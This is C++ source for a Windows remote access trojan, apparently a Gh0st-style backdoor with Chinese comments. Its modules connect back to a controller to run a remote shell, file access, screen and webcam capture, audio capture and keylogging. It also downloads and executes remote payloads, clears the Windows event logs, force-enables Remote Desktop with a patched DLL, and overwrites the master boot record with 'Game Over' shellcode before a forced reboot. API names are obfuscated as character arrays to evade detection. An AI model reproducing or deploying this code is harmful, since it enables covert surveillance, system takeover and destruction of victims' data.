#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "../StdAfx.h"
#include "../Declare.h"   //动态调用库函数
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "RegManager.h"
#include "SerManager.h"
#include "ServerStart.h"
#include "until.h"
#include <wininet.h>
#include "install.h"
#include <tlhelp32.h>
#include <winioctl.h>   //硬盘毁灭文件
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;
extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_SystemManager(SOCKET sRemote)   //系统管理
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	Gyfunction->my_memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	char BrmAP30[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pCreateProcessA(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return true;
}

//如果用urldowntofile的话，程序会卡死在这个函数上
BOOL UpdateServer(LPCTSTR lpURL)
{
	const char *lpFileName = NULL;
	
	char BrmAP30[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	return pCreateProcessA(lpFileName, "Winds Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;

	// System 权限下不能直接利用shellexecute来执行
	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));

	char HrFvD08[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
    RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD08);
	if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;

	char HrFvD07[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','A','\0'};
	RegQueryValueAT pRegQueryValueA=(RegQueryValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);
	pRegQueryValueA(hKey, NULL, strIEPath, &nSize);

	char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	pRegCloseKey(hKey);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (plstrlenA(strIEPath) == 0)
		return false;

	lpstrCat = Gyfunction->my_strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;

	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	plstrcpyA(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 

	char BrmAP30[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pCreateProcessA(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return 0;
}

//发送消息
struct MSGBOX
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}MsgBox;

DWORD WINAPI Loop_MsgBox(LPVOID lParam)
{
    char CtxPW55[] = {'M','e','s','s','a','g','e','B','o','x','A','\0'};
    MessageBoxAT pMessageBoxA=(MessageBoxAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW55);
	Gyfunction->my_memcpy(&MsgBox,lParam,sizeof(MSGBOX));
	pMessageBoxA(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);
	
	return 0;
}

void CleanAllEvent()
{
	char *strEventName[] = {"Application", "Security", "System"};

	char HrFvD13[] = {'C','l','o','s','e','E','v','e','n','t','L','o','g','\0'};
	CloseEventLogT pCloseEventLog=(CloseEventLogT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD13);
	char HrFvD14[] = {'C','l','e','a','r','E','v','e','n','t','L','o','g','A','\0'};
	ClearEventLogAT pClearEventLogA=(ClearEventLogAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD14);
	char HrFvD15[] = {'O','p','e','n','E','v','e','n','t','L','o','g','A','\0'};
	OpenEventLogAT pOpenEventLogA=(OpenEventLogAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD15);
	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = pOpenEventLogA(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		pClearEventLogA(hHandle, NULL);
		pCloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)  //修改备注
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
//	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\Sinking");
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey,JYvni08,lpServiceName);	
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, plstrlenA(lpHostID), 0);
}

void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName)  //修改分组
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
//	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\Sinking");
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey,JYvni08,lpServiceName);
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ConnectGroup", REG_SZ, (char *)lpGroupName, plstrlenA(lpGroupName), 0);
}
/*
bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	char DYrEN52[] = {'I','s','W','i','n','d','o','w','V','i','s','i','b','l','e','\0'};
	IsWindowVisibleT pIsWindowVisible=(IsWindowVisibleT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN52);
	if (!pIsWindowVisible(hwnd))
		return true;
	
	DWORD dwWindowThreadId = NULL;
	DWORD   dwLsassId = (DWORD)lParam;

    char CtxPW53[] = {'G','e','t','W','i','n','d','o','w','T','h','r','e','a','d','P','r','o','c','e','s','s','I','d','\0'};
    GetWindowThreadProcessIdT pGetWindowThreadProcessId=(GetWindowThreadProcessIdT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW53);
	pGetWindowThreadProcessId(hwnd, &dwWindowThreadId);

    char CtxPW51[] = {'S','e','n','d','M','e','s','s','a','g','e','A','\0'};
    SendMessageAT pSendMessageA=(SendMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW51);
	if (dwWindowThreadId == (DWORD)lParam)
	{
		// 关闭指定进程的窗口
		pSendMessageA(hwnd, WM_CLOSE, 0, 0);
	}
	return true;
}
*/
bool IsOSXP()
{
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	char FBwWp05[] = {'G','e','t','V','e','r','s','i','o','n','E','x','A','\0'};
	GetVersionExAT pGetVersionExA=(GetVersionExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp05);
	pGetVersionExA((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	return OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1;
}

DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)          //注册表管理
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CRegManager	manager(&socketClient);
	socketClient.run_event_loop();
	
	return 0;
}

DWORD WINAPI Loop_SerManager(SOCKET sRemote)   //服务管理
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSerManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Server_start(SOCKET sRemote)  //服务器管理
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CServerStart manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

void DEL_ShiftOsk()     //服务器后门删除
{
	CHAR SystemPath[MAX_PATH] = {0};
	CHAR SystemPath_Shift[MAX_PATH] = {0};
	CHAR SystemPath_Osk[MAX_PATH] = {0};
	CHAR SystemPath_magnify[MAX_PATH] = {0};
	CHAR DllcachePath_Shift[MAX_PATH] = {0};
	CHAR DllcachePath_Osk[MAX_PATH] = {0};
	CHAR DllcachePath_magnify[MAX_PATH] = {0};

	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary(Lfrfz02),Mstvw01);
	pGetSystemDirectoryA(SystemPath, sizeof(SystemPath));

    Gyfunction->my_sprintf(SystemPath_Shift,"%s\\sethc.exe",SystemPath);
	Gyfunction->my_sprintf(SystemPath_Osk,"%s\\osk.exe",SystemPath);
	Gyfunction->my_sprintf(SystemPath_magnify,"%s\\magnify.exe",SystemPath);  

	Gyfunction->my_sprintf(DllcachePath_Shift,"%s\\dllcache\\sethc.exe",SystemPath);
	Gyfunction->my_sprintf(DllcachePath_Osk,"%s\\dllcache\\osk.exe",SystemPath);
	Gyfunction->my_sprintf(DllcachePath_magnify,"%s\\dllcache\\magnify.exe",SystemPath);

	char QUHZg55[] = {'D','e','l','e','t','e','F','i','l','e','A','\0'};
	DeleteFileAT pDeleteFileA = (DeleteFileAT)GetProcAddress(LoadLibrary(Lfrfz02),QUHZg55);
	char FBwWp25[] = {'S','l','e','e','p','\0'};
	SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp25);

	for(CHAR strp=0;strp<4;strp++)   //多次删除
	{
	    pDeleteFileA(DllcachePath_Shift);    //删除\\dllcache\\sethc.exe文件  Shift粘滞键
	    pDeleteFileA(DllcachePath_Osk);      //删除\\dllcache\\osk.exe文件   软键盘
	    pDeleteFileA(DllcachePath_magnify);  //删除\\dllcache\\magnify.exe文件   放大镜
		pSleep(50);
		pDeleteFileA(SystemPath_Shift);      //删除\\sethc.exe文件
		pDeleteFileA(SystemPath_Osk);        //删除\\osk.exe文件
	    pDeleteFileA(SystemPath_magnify);    //删除\\magnify.exe文件
		pSleep(20000);
	}
}

BOOL Server_operation( const void *filedata, UINT size )  //服务器操作
{

	if(strcmp((const char *)filedata,"DELSHIFTOSK")==0)  //后门删除
	{
		DEL_ShiftOsk();     //服务器后门删除
	}
//	CHAR SPath[MAX_PATH] = {0};
//	my_sprintf(SPath,"%s\\%d",(const char *)filedata,size);
//	MessageBox(NULL, SPath, "提示！！", MB_OK);
	return 0;
}

bool Open3389( const void *filedata, UINT size )
{	
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService","Start",REG_DWORD,NULL,2,0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "KeepRASConnections", REG_SZ, "1", 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", REG_DWORD, NULL, 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core", "EnableConcurrentSessions", 
			REG_DWORD, NULL, 1, 0);
	if (IsOSXP())
	{	
		WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", "ServiceDll", REG_EXPAND_SZ,
	   "%SystemRoot%\\system32\\termsrvhack.dll", 0, 0);
		// 替换DLL
		FILE	*fp;
		char strSystemPath[MAX_PATH], strDllcachePath[MAX_PATH];
	    char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	    GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Mstvw01);
		pGetSystemDirectoryA(strSystemPath, sizeof(strSystemPath));
		pGetSystemDirectoryA(strDllcachePath, sizeof(strDllcachePath));
		char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
		lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
		plstrcatA(strSystemPath, "\\termsrvhack.dll");
		plstrcatA(strDllcachePath, "\\dllcache\\termsrvhack.dll");
		
		fp = fopen( strSystemPath, "wb" );
		fwrite( filedata, size, 1, fp );
		fclose(fp);
		char sIQkS07[] = {'C','o','p','y','F','i','l','e','A','\0'};
		CopyFileAT pCopyFileA=(CopyFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS07);
		pCopyFileA( strSystemPath, strDllcachePath, FALSE );
		SetFileAttributesAT pSetFileAttributesA=(SetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetFileAttributesA");
		pSetFileAttributesA(strSystemPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
		pSetFileAttributesA(strDllcachePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	}
	StartService("TermService");
	return 0;
}

//硬盘毁灭
////////////////////////////////////////////////////////////////////////////////////////////
unsigned char scode[] = 
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x47\x61\x6d\x65\x20\x4f\x76\x65"
"\x72\x20\x47\x6f\x6f\x64\x20\x4c\x75\x63\x6b\x20\x42\x79\x20\x57"
"\x69\x6e\x64";

int KillMBR()
{	
	//	ExitWindowsExT   pExitWindowsEx =  (ExitWindowsExT)GetProcAddress(LoadLibrary("USER32.dll"), "ExitWindowsEx");
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	
	// 重新构造MBR
	Gyfunction->my_memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	
	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);
	hDevice = pCreateFileA("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControlT pDeviceIoControl=(DeviceIoControlT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DeviceIoControl");
	pDeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	// 写入病毒内容
	char HvnXs02[] = {'W','r','i','t','e','F','i','l','e','\0'};
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs02);
	pWriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	pDeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hDevice);
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	pSleep(2000);
	GetVersionT pGetVersion=(GetVersionT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetVersion");
	DWORD   dwVersion   =   pGetVersion();   

    char CtxPW56[] = {'E','x','i','t','W','i','n','d','o','w','s','E','x','\0'};
    ExitWindowsExT pExitWindowsEx=(ExitWindowsExT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW56);
    if   (dwVersion   <   0x80000000)   //   Is   NT   or   2000!   
    {   HANDLE   hToken;   TOKEN_PRIVILEGES   tkp;   

	char CtxPW35[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW35);

    char Wffkl01[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
    GetCurrentProcessT pGetCurrentProcess=(GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
	pOpenProcessToken(pGetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES   |   TOKEN_QUERY,   &hToken); 

    char CtxPW34[] = {'L','o','o','k','u','p','P','r','i','v','i','l','e','g','e','V','a','l','u','e','A','\0'};
    LookupPrivilegeValueAT pLookupPrivilegeValueA=(LookupPrivilegeValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW34);
	pLookupPrivilegeValueA(NULL,   SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount   =   1;   //   set   privilege   
	tkp.Privileges[0].Attributes   =   SE_PRIVILEGE_ENABLED;

    char CtxPW33[] = {'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s','\0'};
    AdjustTokenPrivilegesT pAdjustTokenPrivileges=(AdjustTokenPrivilegesT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW33);
	pAdjustTokenPrivileges(hToken,   FALSE,   &tkp,   0,(PTOKEN_PRIVILEGES)NULL,   0); 

	pExitWindowsEx(EWX_FORCE+EWX_REBOOT,   0);   }  
	else   //   Is   9x   or   Me   
		pExitWindowsEx(EWX_FORCE+EWX_REBOOT,0);

	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"ExitProcess");
	pExitProcess(-1);
	return 0;
}
/*
BOOL isProcesin(LPTSTR lpProcess)//进程筛选
{
	char SSzlC11[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char SSzlC10[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0'};
	CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot= (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary(SSzlC11),SSzlC10);
	HANDLE handle=pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
    info->dwSize=sizeof(PROCESSENTRY32);
	char MyProcess32Next[] ={'P','r','o','c','e','s','s','3','2','N','e','x','t','\0'};
	Process32NextT pProcess32Next= (Process32NextT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32Next);
	char MyProcess32First[] ={'P','r','o','c','e','s','s','3','2','F','i','r','s','t','\0'};
	Process32FirstT pProcess32First= (Process32FirstT)GetProcAddress(LoadLibrary(SSzlC11),MyProcess32First);
	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp06);
	if(pProcess32First(handle,info))
	{
		if(pGetLastError()==ERROR_NO_MORE_FILES )
		{
			return false;
		}
		else{
			
			if (my_strstr5(my_strupr(info->szExeFile),my_strupr(lpProcess)) > 0)
			{
				return true;
			}
			while(pProcess32Next(handle,info)!=FALSE)
			{
				if (my_strstr5(my_strupr(info->szExeFile),my_strupr(lpProcess)) > 0)
				{
					return true;
				}
			}
		}
	}
	return false;
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(handle);
}
*/


#endif // !defined(AFX_LOOP_H_INCLUDED)